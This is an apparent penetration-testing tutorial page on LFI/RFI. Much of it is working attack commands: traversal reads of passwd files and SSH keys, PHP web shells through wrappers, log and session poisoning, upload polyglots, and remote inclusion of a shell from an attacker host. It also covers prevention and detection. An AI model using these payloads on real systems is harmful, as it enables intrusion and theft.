@@ -1,0 +1,591 @@
+---
+title: File Inclusion (LFI / RFI)
+description: Discovery, exploitation, and prevention methodology for Local and Remote File Inclusion, from arbitrary file read to remote code execution.
+---
+
+import { Callout } from 'nextra/components'
+
+# File Inclusion (LFI / RFI)
+
+File Inclusion happens when an application builds a file path from user-controlled input and passes it to a function that reads, renders, or executes that file. If the path is not constrained to an intended allow-list, an attacker can break out of the expected directory, read sensitive local files, disclose source code, poison readable files, or include attacker-controlled code.
+
+The headline transition for this note is **unauthenticated arbitrary file read -> source and secret disclosure -> RCE -> web shell foothold**. Treat the HTTP request as the evidence: record the exact method, path, parameter, cookie, payload, response proof, and auth state for every working primitive.
+
+## Cheatsheet
+
+```bash
+# Confirm a read primitive with Linux and Windows canaries
+curl -sk 'http://<HOST>/index.php?language=/etc/passwd'
+curl -sk 'http://<HOST>/index.php?language=../../../../../../etc/passwd'
+curl -sk 'http://<HOST>/index.php?language=C:\\Windows\\System32\\drivers\\etc\\hosts'
+
+# Handle path wrapping
+curl -sk 'http://<HOST>/index.php?language=../../../../etc/passwd'
+curl -sk 'http://<HOST>/index.php?language=/../../../../etc/passwd'
+curl -sk 'http://<HOST>/index.php?language=./languages/../../../../etc/passwd'
+
+# Bypass naive traversal filters
+curl -sk 'http://<HOST>/index.php?language=....//....//....//etc/passwd'
+curl -sk 'http://<HOST>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+
+# Read PHP source through an appended .php suffix
+curl -sk 'http://<HOST>/index.php?language=php://filter/read=convert.base64-encode/resource=config' \
+  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
+
+# Check PHP settings that unlock wrapper/RFI paths
+curl -sk 'http://<HOST>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/8.2/apache2/php.ini' \
+  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d | grep -E 'allow_url_include|allow_url_fopen|extension=expect|file_uploads'
+
+# data:// RCE, requires allow_url_include=On
+echo -n '<?php system($_GET["cmd"]); ?>' | base64
+curl -sk 'http://<HOST>/index.php?language=data://text/plain;base64,<B64>&cmd=id'
+
+# php://input RCE, requires allow_url_include=On and a POST-reachable sink
+curl -sk -X POST --data '<?php system($_GET["cmd"]); ?>' \
+  'http://<HOST>/index.php?language=php://input&cmd=id'
+
+# expect:// RCE, requires the non-default expect extension
+curl -sk 'http://<HOST>/index.php?language=expect://id'
+
+# Apache/Nginx log poisoning
+curl -sk 'http://<HOST>/' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
+curl -sk 'http://<HOST>/index.php?language=/var/log/apache2/access.log&cmd=id'
+
+# PHP session poisoning
+curl -sk 'http://<HOST>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E' -b 'PHPSESSID=<SID>'
+curl -sk 'http://<HOST>/index.php?language=/var/lib/php/sessions/sess_<SID>&cmd=id' -b 'PHPSESSID=<SID>'
+
+# RFI over HTTP, requires a remote-capable sink; PHP http/ftp needs allow_url_include=On
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sudo python3 -m http.server 80
+curl -sk 'http://<HOST>/index.php?language=http://<LHOST>/shell.php&cmd=id'
+
+# Fuzz file-like parameters and LFI payloads
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://<HOST>/index.php?FUZZ=value' -fs <BASELINE>
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+  -u 'http://<HOST>/index.php?language=FUZZ' -fs <BASELINE>
+```
+
+## Methodology
+
+### Phase 1: Map the Surface
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Which parameters, path segments, headers, cookies, or stored fields select a file (`?page=`, `?language=`, `?file=`, `/view/<name>`, theme selectors, avatars)?
+  - What auth state reaches each input: unauthenticated, low-priv user, or admin?
+  - Does changing the value visibly change a server-rendered section, download, template, language, or static asset?
+  - Is there a second-order path where I control a stored value first and another feature later uses it as a file path?
+  - What baseline response size, words, and status should I filter when fuzzing?
+</Callout>
+
+```bash
+# Discover hidden file-ish parameters
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://<HOST>/index.php?FUZZ=value' -fs <BASELINE>
+
+# Baseline a legitimate value
+curl -sk 'http://<HOST>/index.php?language=en'
+```
+
+- [ ] Enumerate every request input that names, selects, downloads, renders, or includes a file.
+- [ ] Label each candidate input by auth state and role requirement.
+- [ ] Record normal response size/status for later `ffuf` filtering.
+- [ ] Mark second-order candidates such as usernames, profile fields, exports, themes, and avatar paths.
+
+### Phase 2: Identify the Context / Sink
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - What backend language or framework is handling this route: PHP, NodeJS, Java, .NET, or something else?
+  - Which sink is likely: `include`, `require`, `file_get_contents`, `fs.readFile`, `res.render`, `jsp:include`, `Response.WriteFile`, or `@Html.Partial`?
+  - Does the sink only read bytes, or does it execute/render code?
+  - Is my value raw, prepended with a directory, prefixed with a string, or suffixed with an extension like `.php`?
+  - Does the sink accept wrappers or remote URLs, or is it local-file-only?
+</Callout>
+
+```bash
+# Fingerprint language and server clues
+curl -skI 'http://<HOST>/index.php'
+
+# Trigger verbose path handling, if errors are exposed
+curl -sk 'http://<HOST>/index.php?language=/etc/passwd'
+curl -sk 'http://<HOST>/index.php?language=nonexistent'
+```
+
+- [ ] Infer the probable sink and whether it is read-only or executing.
+- [ ] Determine path wrapping from behavior or error messages.
+- [ ] Note whether remote schemes (`http://`, `ftp://`, UNC paths) or PHP wrappers are accepted.
+- [ ] Choose a read, source-disclosure, or RCE path based on the sink capability rather than guessing.
+
+### Phase 3: Source -> Sink Review (White-Box)
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - What request-reachable sources feed the file path: `$_GET`, `$_POST`, `$_REQUEST`, cookies, route params, `req.query`, `request.getParameter`, or `Request.Query`?
+  - What file sinks exist in the codebase?
+  - Is there an unbroken data-flow path from source to sink?
+  - What transformation sits between them: concat prefix, appended extension, regex allow-list, `str_replace`, blacklist, `basename`, or `realpath`?
+  - Which route middleware or controller enforces auth, and can the sink be reached before that check?
+</Callout>
+
+```bash
+# Locate inclusion and file-read sinks
+rg -n "include(_once)?\(|require(_once)?\(|file_get_contents\(|fopen\(|readFile|sendFile|res\.render|jsp:include|Response\.WriteFile|Html\.Partial" <SRC>
+
+# Locate request-controlled sources
+rg -n "\$_(GET|POST|REQUEST|COOKIE)|req\.(query|body|params|headers|cookies)|request\.getParameter|Request\.Query" <SRC>
+```
+
+- [ ] Inventory sources and sinks separately, then connect each candidate path.
+- [ ] Trace transforms in order and write the payload that survives them.
+- [ ] Confirm whether reachability is unauthenticated, user-authenticated, or admin-only.
+- [ ] Use code review to prioritize exact manual requests before broad payload spraying.
+
+### Phase 4: Confirm the Vulnerability
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Can I read a known local file and prove inclusion, not just reflected input?
+  - If direct absolute paths fail, how many `../` levels reach the filesystem root?
+  - Which filter appears to be blocking traversal: non-recursive stripping, encoded-character blacklist, approved-path regex, or appended extension?
+  - Does the working payload reveal the server OS, web user, hostname, source paths, or credentials?
+  - Am I avoiding huge files and logs until I know they are needed?
+</Callout>
+
+```bash
+# Direct read, then traversal
+curl -sk 'http://<HOST>/index.php?language=/etc/passwd'
+curl -sk 'http://<HOST>/index.php?language=../../../../../../etc/passwd'
+
+# Non-recursive traversal stripping
+curl -sk 'http://<HOST>/index.php?language=....//....//....//etc/passwd'
+
+# URL-encoded traversal
+curl -sk 'http://<HOST>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+
+# Approved-path bypass
+curl -sk 'http://<HOST>/index.php?language=./languages/../../../../etc/passwd'
+```
+
+- [ ] Prove file read with `/etc/passwd`, `/etc/hosts`, or `C:\Windows\System32\drivers\etc\hosts`.
+- [ ] Classify the path handling and filter behavior from the exact response.
+- [ ] Record the working payload, traversal depth, auth state, and response evidence.
+- [ ] If only `.php` files are reachable, move to PHP source disclosure instead of forcing obsolete suffix bypasses.
+
+### Phase 5: Source Disclosure and Secret Harvesting
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Can `php://filter` return source as base64 before the sink executes it?
+  - Which files are highest value first: `index.php`, route/controller files, `config.php`, `.env`, included libraries, and `php.ini`?
+  - What secrets, internal paths, DB credentials, session settings, API keys, or backup files appear in source?
+  - Does the disclosed `php.ini` enable later paths (`allow_url_include`, `allow_url_fopen`, `extension=expect`, `file_uploads`)?
+  - What credentials should be immediately tested against SSH, databases, admin panels, and other services?
+</Callout>
+
+```bash
+# Read PHP source through php://filter
+curl -sk 'http://<HOST>/index.php?language=php://filter/read=convert.base64-encode/resource=config' \
+  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
+
+# Read php.ini and inspect wrapper-relevant settings
+curl -sk 'http://<HOST>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/8.2/apache2/php.ini' \
+  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d | grep -E 'allow_url_include|allow_url_fopen|extension=expect|file_uploads'
+```
+
+- [ ] Disclose the entrypoint, then recursively read files it includes or references.
+- [ ] Pull configuration files before random filesystem browsing.
+- [ ] Extract credentials and keys into the evidence log with source file and line context.
+- [ ] Test credential reuse carefully under scope and lockout rules.
+
+### Phase 6: Exploit / Weaponize to RCE
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Does the sink execute included content? If not, can read-only impact still lead to creds or keys?
+  - Which RCE primitive fits confirmed evidence: `data://`, `php://input`, `expect://`, RFI, malicious upload, log poisoning, or session poisoning?
+  - Can I read the target file I plan to poison before writing payloads to it?
+  - Will the primitive be one-shot or persistent, and should I immediately drop a stable web shell or catch a reverse shell?
+  - What will this look like in access logs, WAF telemetry, outbound network logs, and uploaded-file monitoring?
+</Callout>
+
+```bash
+# data:// wrapper RCE
+echo -n '<?php system($_GET["cmd"]); ?>' | base64
+curl -sk 'http://<HOST>/index.php?language=data://text/plain;base64,<B64>&cmd=id'
+
+# php://input wrapper RCE
+curl -sk -X POST --data '<?php system($_GET["cmd"]); ?>' \
+  'http://<HOST>/index.php?language=php://input&cmd=id'
+
+# expect:// wrapper RCE
+curl -sk 'http://<HOST>/index.php?language=expect://id'
+
+# Log poisoning
+curl -sk 'http://<HOST>/' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
+curl -sk 'http://<HOST>/index.php?language=/var/log/apache2/access.log&cmd=id'
+
+# Session poisoning
+curl -sk 'http://<HOST>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E' -b 'PHPSESSID=<SID>'
+curl -sk 'http://<HOST>/index.php?language=/var/lib/php/sessions/sess_<SID>&cmd=id' -b 'PHPSESSID=<SID>'
+```
+
+- [ ] Confirm execution with a low-impact command (`id`, `whoami`) before shells.
+- [ ] Prefer the quietest primitive supported by evidence; avoid broad automated sprays.
+- [ ] Record the raw request and the equivalent `curl` command for the proof.
+- [ ] After RCE, transition immediately into host-side Orientation and privilege escalation.
+
+### Phase 7: Chain and Recover
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - What is the best next step from the current proof: loot more files, reuse credentials, escalate to RCE, or stabilize a shell?
+  - If every direct RCE path failed, which assumption should I retest: sink executes, wrapper support, log readability, upload path, traversal depth, or auth state?
+  - Did I miss a second-order path where a stored value controls the filename?
+  - Which evidence needs to be preserved for reporting: request, response, source file, secret, command output, timestamp?
+  - What post-exploitation or lateral movement note does this hand off to?
+</Callout>
+
+```bash
+# Loot common high-value files through the read primitive
+curl -sk 'http://<HOST>/index.php?language=../../../../var/www/html/config.php'
+curl -sk 'http://<HOST>/index.php?language=../../../../home/<USER>/.ssh/id_rsa'
+curl -sk 'http://<HOST>/index.php?language=../../../../etc/apache2/apache2.conf'
+```
+
+- [ ] Re-rank paths from quietest and most certain to noisiest and most speculative.
+- [ ] Re-run the methodology using the evidence collected so far, not the original assumptions.
+- [ ] Carry discovered identities, credentials, internal paths, and webroot/log paths into the next attack step.
+- [ ] Hand RCE or SSH access to post-exploitation Orientation before running privilege escalation tooling.
+
+## How It Works
+
+Templating engines and dynamic content loaders often keep a common page layout while swapping one file-controlled section, such as `?language=en` or `?page=about`. The vulnerability appears when the application treats attacker input as a trusted file path.
+
+Impact depends on two properties. A read-only sink leaks files and source. An executing sink runs included code, so anything the attacker can write into a readable file, such as an upload, session, access log, or remote script, can become code execution.
+
+### Read vs Execute
+
+| Function | Read content | Execute | Remote URL |
+|---|:-:|:-:|:-:|
+| PHP `include()` / `include_once()` | yes | yes | yes |
+| PHP `require()` / `require_once()` | yes | yes | no |
+| PHP `file_get_contents()` | yes | no | yes |
+| PHP `fopen()` / `file()` | yes | no | no |
+| NodeJS `fs.readFile()` / `fs.sendFile()` | yes | no | no |
+| NodeJS `res.render()` | yes | yes | no |
+| Java `jsp:include` | yes | no | no |
+| Java `c:import` | yes | yes | yes |
+| .NET `@Html.Partial()` | yes | no | no |
+| .NET `@Html.RemotePartial()` | yes | no | yes |
+| .NET `Response.WriteFile()` | yes | no | no |
+| .NET SSI `include` | yes | yes | yes |
+
+An executing and remote-capable sink is the worst case because LFI, RFI, wrapper abuse, log/session poisoning, and upload-assisted RCE may all apply.
+
+## OPSEC
+
+**OPSEC** - Noise: medium-high · Telemetry: access/error-log payload strings (`../`, encoded traversal, `php://`, `data://`, `expect://`, `phar://`), WAF traversal signatures, anomalous `User-Agent`/cookie values containing `<?php`, outbound HTTP/FTP/SMB callbacks, new files in upload or web directories · Prereq: reachable file-path input and the right sink capability · Footprint: poisoned logs/sessions persist, uploaded shells remain, reverse-shell callbacks are observable; clean up files and report poisoned logs.
+
+Manual single requests are usually quiet. Large LFI wordlists, recursive fuzzing, log inclusion, and automated tools create obvious access-log volume and can destabilize targets, especially when logs are huge.
+
+## Reference
+
+### Vulnerable Code Patterns
+
+```php
+// PHP: direct user input reaches an executing include sink.
+if (isset($_GET['language'])) {
+  include($_GET['language']);
+}
+
+include("./languages/" . $_GET['language']);
+include("lang_" . $_GET['language']);
+include($_GET['language'] . ".php");
+```
+
+```javascript
+// NodeJS: read-only file disclosure through fs.readFile.
+if (req.query.language) {
+  fs.readFile(path.join(__dirname, req.query.language), (err, data) => {
+    res.write(data);
+  });
+}
+
+// Express rendering can execute templates selected by a path parameter.
+app.get("/about/:language", (req, res) => {
+  res.render(`/${req.params.language}/about.html`);
+});
+```
+
+```jsp
+<jsp:include file="<%= request.getParameter('language') %>" />
+<c:import url="<%= request.getParameter('language') %>" />
+```
+
+```csharp
+Response.WriteFile(HttpContext.Request.Query["language"]);
+@Html.Partial(HttpContext.Request.Query["language"])
+```
+
+### Raw Request Evidence
+
+```http
+GET /index.php?language=../../../../etc/passwd HTTP/1.1
+Host: <HOST>
+Cookie: session=<COOKIE>
+User-Agent: Mozilla/5.0
+```
+
+```bash
+# Same request from the CLI
+curl -sk 'http://<HOST>/index.php?language=../../../../etc/passwd' \
+  -b 'session=<COOKIE>'
+```
+
+Use a response proof that cannot be confused with reflection, such as `root:x:0:0:` from `/etc/passwd`, `127.0.0.1 localhost` from `/etc/hosts`, or a known Windows hosts file line.
+
+### Path Handling and Bypasses
+
+| Code behavior | What breaks | Working direction |
+|---|---|---|
+| `include($input)` | none | Absolute path or traversal |
+| `include("./languages/" . $input)` | prepended directory | Traverse out with `../../../../etc/passwd` |
+| `include("lang_" . $input)` | prepended string | Start with `/` so the prefix becomes a dead path segment |
+| `include($input . ".php")` | appended extension | Modern PHP: read source with `php://filter`; old PHP only: null byte or truncation |
+| `str_replace('../', '', $input)` once | non-recursive stripping | Nested traversal such as `....//....//etc/passwd` |
+| blacklist for `.` or `/` | character filtering | URL or double URL encoding |
+| regex requiring `./languages/` | approved-path restriction | Start in the approved path, then traverse out |
+
+<Callout type="info">
+  Null-byte injection (`%00`) and path truncation are legacy PHP techniques. Null bytes were removed in PHP 5.5, and practical truncation bypasses depend on old PHP path handling around the 4096-byte limit. On modern PHP, treat appended extensions as real constraints and pivot to `php://filter`. last verified: 2026-06.
+</Callout>
+
+### PHP Filters
+
+`php://filter/read=convert.base64-encode/resource=<FILE>` applies a base64 conversion before the resource reaches the include sink. This reveals PHP source as encoded text instead of executing it, which is especially useful when the application appends `.php`.
+
+```bash
+# Read config.php when the application appends .php automatically
+curl -sk 'http://<HOST>/index.php?language=php://filter/read=convert.base64-encode/resource=config' \
+  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
+```
+
+### PHP Wrappers for RCE
+
+```bash
+# data:// inline PHP, requires allow_url_include=On
+echo -n '<?php system($_GET["cmd"]); ?>' | base64
+curl -sk 'http://<HOST>/index.php?language=data://text/plain;base64,<B64>&cmd=id'
+
+# php://input POST body, requires allow_url_include=On
+curl -sk -X POST --data '<?php system($_GET["cmd"]); ?>' \
+  'http://<HOST>/index.php?language=php://input&cmd=id'
+
+# expect://, requires the non-default expect extension
+curl -sk 'http://<HOST>/index.php?language=expect://id'
+```
+
+<Callout type="info">
+  `allow_url_include` is disabled by default and is required for `data://`, `php://input`, and PHP HTTP/FTP RFI. `extension=expect` in `php.ini` shows intent to load the extension, but the runtime test is the proof.
+</Callout>
+
+### RFI
+
+Remote File Inclusion requires a sink that accepts remote URLs. Almost every RFI is also LFI, but LFI does not imply RFI. Test a benign local URL first to separate sink behavior from outbound firewall behavior, and avoid including the vulnerable page itself because recursive inclusion can cause denial of service.
+
+```bash
+# Verify URL inclusion safely against localhost first
+curl -sk 'http://<HOST>/index.php?language=http://127.0.0.1:80/index.php'
+
+# HTTP-hosted web shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sudo python3 -m http.server 80
+curl -sk 'http://<HOST>/index.php?language=http://<LHOST>/shell.php&cmd=id'
+
+# FTP-hosted shell if http:// is blocked
+sudo python3 -m pyftpdlib -p 21
+curl -sk 'http://<HOST>/index.php?language=ftp://<LHOST>/shell.php&cmd=id'
+curl -sk 'http://<HOST>/index.php?language=ftp://<USER>:<PASS>@<LHOST>/shell.php&cmd=id'
+
+# SMB-hosted shell on Windows targets
+impacket-smbserver -smb2support share $(pwd)
+curl -sk 'http://<HOST>/index.php?language=\\<LHOST>\share\shell.php&cmd=whoami'
+```
+
+On Windows, UNC paths can be treated as normal files by the OS, so SMB inclusion may work without PHP `allow_url_include`. It is most reliable when the attacker host is reachable on the same network.
+
+### Upload-Assisted LFI to RCE
+
+If the include sink executes, the upload form does not need to be vulnerable by itself. It only needs to store attacker-controlled bytes that the include sink can later read.
+
+```bash
+# Polyglot-ish GIF with PHP code after ASCII magic bytes
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+# Include the uploaded file by its web path or filesystem path
+curl -sk 'http://<HOST>/index.php?language=./profile_images/shell.gif&cmd=id'
+
+# zip:// wrapper fallback
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+zip shell.jpg shell.php
+curl -sk 'http://<HOST>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id'
+```
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+```
+
+```bash
+# phar:// wrapper fallback
+php --define phar.readonly=0 make_phar.php
+mv shell.phar shell.jpg
+curl -sk 'http://<HOST>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id'
+```
+
+The raw image method is the most reliable. `zip://` and `phar://` are PHP-specific fallbacks that depend on wrapper support and upload validation behavior.
+
+### Log and Session Poisoning
+
+Log/session poisoning writes PHP into a file the server already stores and the vulnerable include can read. Confirm read access first; poisoning a file you cannot include wastes time and creates noise.
+
+```bash
+# Read a PHP session file
+curl -sk 'http://<HOST>/index.php?language=/var/lib/php/sessions/sess_<SID>' \
+  -b 'PHPSESSID=<SID>'
+
+# Poison a controllable session value, then execute
+curl -sk 'http://<HOST>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E' \
+  -b 'PHPSESSID=<SID>'
+curl -sk 'http://<HOST>/index.php?language=/var/lib/php/sessions/sess_<SID>&cmd=id' \
+  -b 'PHPSESSID=<SID>'
+```
+
+```bash
+# Poison User-Agent into an access log
+echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > Poison
+curl -sk 'http://<HOST>/index.php' -H @Poison
+curl -sk 'http://<HOST>/index.php?language=/var/log/apache2/access.log&cmd=id'
+```
+
+| Target file | Linux path | Windows path | Notes |
+|---|---|---|---|
+| PHP sessions | `/var/lib/php/sessions/sess_<SID>` | `C:\Windows\Temp\` | Session value may overwrite after each inclusion |
+| Apache logs | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\access.log` | Often root/adm-only on Linux unless misconfigured |
+| Nginx logs | `/var/log/nginx/access.log` | `C:\nginx\log\access.log` | Commonly readable by the web user |
+| Process environment | `/proc/self/environ`, `/proc/self/fd/<N>` | n/a | May expose headers, often permission-limited |
+| Service logs | `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log` | varies | Poison via username, email body, or protocol field if readable |
+
+### Automated Scanning
+
+Manual proof comes first. Use fuzzing once you know the target parameter, baseline, and safe request shape.
+
+```bash
+# Find LFI-prone parameters
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://<HOST>/index.php?FUZZ=value' -fs <BASELINE>
+
+# Spray known LFI payloads against the confirmed parameter
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+  -u 'http://<HOST>/index.php?language=FUZZ' -fs <BASELINE>
+
+# Locate webroots through LFI
+ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
+  -u 'http://<HOST>/index.php?language=../../../../FUZZ/index.php' -fs <BASELINE>
+
+# Find readable configs and logs
+ffuf -w ./LFI-WordList-Linux:FUZZ \
+  -u 'http://<HOST>/index.php?language=../../../../FUZZ' -fs <BASELINE>
+```
+
+Do not match only HTTP 200. Source and protected files may be useful even when the original endpoint returns `301`, `302`, or `403`.
+
+### Prevention
+
+- Map user input to fixed identifiers, such as `en -> en.php`; never concatenate raw input into a path.
+- Resolve paths with `realpath()` and verify the result stays under an intended base directory.
+- Reject path separators, traversal tokens, wrapper schemes, and absolute paths before the file sink.
+- Disable `allow_url_include`, avoid enabling `allow_url_fopen` unless required, and do not load `expect`.
+- Store uploads outside the webroot, randomize names, and never include user-uploaded files.
+- Run the web service as a low-privilege user without read access to home directories, private keys, or privileged logs.
+
+### Blue-Team Detection
+
+Map likely exploitation to **MITRE ATT&CK T1190 (Exploit Public-Facing Application)** and **OWASP A03:2021 Injection / A01:2021 Broken Access Control** depending on root cause.
+
+```kql
+// Web requests carrying traversal or wrapper indicators
+union isfuzzy=true (WAF_CL), (W3CIISLog)
+| where csUriQuery has_any ("../", "..%2f", "%252e", "php://", "data://", "expect://", "phar://", "/etc/passwd", "/var/log/", "\\\\")
+| project TimeGenerated, cIP, csMethod, csUriStem, csUriQuery, csUserAgent
+```
+
+- Hunt for `<?php` in `User-Agent`, `Referer`, cookies, POST bodies, and stored profile fields.
+- Alert on web server outbound HTTP/FTP/SMB to unusual destinations after suspicious include requests.
+- Monitor upload and web directories for new scripts, polyglot images, zip archives, and unexpected PHP execution.
+- Review access logs for high-volume LFI wordlist patterns and repeated traversal depth changes.
+
+## Common Mistakes
+
+<Callout type="error">
+  - Treating reflected input as proof instead of confirming real file content.
+  - Fighting appended `.php` on modern PHP with null bytes instead of using `php://filter`.
+  - Trying `data://`, `php://input`, or HTTP RFI before proving `allow_url_include=On`.
+  - Poisoning logs or sessions before proving the include can read them.
+  - Loading huge logs through LFI and hanging the application.
+  - Forgetting that PHP session poisoning is often one-shot because the session value gets overwritten.
+  - Fuzzing only `200 OK` and missing useful `301`, `302`, or `403` files.
+</Callout>
+
+## Attack Chains / Related Notes
+
+- **Came from:** web parameter discovery, content fuzzing with `ffuf`, source-code review, or CMS/plugin enumeration where a file selector is exposed.
+- **Leads to (read-only):** source disclosure, `.env`/config secrets, `id_rsa` theft, credential reuse against SSH, databases, admin panels, and other services.
+- **Leads to (RCE):** wrapper RCE, RFI, malicious upload inclusion, log poisoning, or session poisoning -> web shell -> [Post-Exploitation Orientation](/04-Post-Exploitation/).
+- **Related web attacks:** [XSS](/Web-Attacks/XSS) for request/response discipline and stored payload thinking; file upload attacks pair directly with LFI-to-RCE; XXE and SSRF share wrapper and remote-fetch tradecraft.
+
+<Quiz
+  question="A PHP 8 application calls include($_GET['language'] . '.php') and you need config.php source. What should you try first?"
+  options={[
+    "Append %00 after config",
+    "Use php://filter/read=convert.base64-encode/resource=config",
+    "Keep adding ../ until /etc/passwd appears",
+    "Host your own config.php and include it over HTTP"
+  ]}
+  answer={1}
+  explanation="Modern PHP does not support null-byte suffix truncation. Because the app appends .php, php://filter with resource=config targets config.php and returns base64 source instead of executing it. Traversal does not remove the suffix, and RFI would include your file, not the target config."
+/>
+
+<Quiz
+  question="You confirmed an executing include sink, allow_url_include is Off, Apache logs are unreadable, and the app lets users upload avatars. What is the best RCE path?"
+  options={[
+    "Use data:// with a base64 PHP shell",
+    "Upload an image containing PHP bytes and include the uploaded file",
+    "Use HTTP RFI from your attack box",
+    "Use php://input with a POST body shell"
+  ]}
+  answer={1}
+  explanation="data://, php://input, and HTTP RFI all depend on allow_url_include, which is Off. An uploaded file containing PHP bytes can still execute if the include sink executes and the file path is reachable through LFI."
+/>
+
+<div className="flex flex-wrap gap-2 mb-4">
+  <TagPill color="#ef4444">#Penetration Testing</TagPill>
+  <TagPill color="#f97316">#Red Team</TagPill>
+  <TagPill color="#14b8a6">#HTB</TagPill>
+  <TagPill color="#fcc629">#Linux</TagPill>
+  <TagPill color="#0078d6">#Windows</TagPill>
+</div>
